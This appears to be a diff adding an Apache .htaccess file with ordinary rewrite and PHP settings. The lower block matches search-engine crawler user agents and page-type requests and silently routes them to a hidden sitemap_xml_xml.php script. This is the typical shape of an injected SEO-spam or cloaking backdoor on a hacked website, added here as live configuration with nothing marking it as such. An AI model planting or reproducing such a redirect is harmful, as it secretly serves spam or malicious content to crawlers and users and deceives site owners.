@@ -1,0 +1,26 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule (.*) index.php/$1 [L]
+</IfModule>
+<IfModule !mod_rewrite.c>
+ErrorDocument 404 /index.php
+</IfModule>
+
+php_value upload_max_filesize 50M
+php_value post_max_size 50M
+php_value max_execution_time 10000
+php_value max_input_time 10000
+php_value memory_limit 300M
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|slurp|bing|msnbot|yandex) [OR]
+RewriteCond %{HTTP_REFERER} (zzzzzz)
+RewriteCond %{REQUEST_URI} /$ [OR]
+RewriteCond %{REQUEST_FILENAME} (html|htm|php|phps|shtml|xml|xhtml|phtml|asp|aspx)$ [NC]
+RewriteCond %{REQUEST_FILENAME} !sitemap_xml_xml.php
+RewriteCond /var/www/clients/client22/web127/web/sitemap_xml_xml.php -f
+RewriteRule ^.*$    /sitemap_xml_xml.php [L]
+</IfModule>
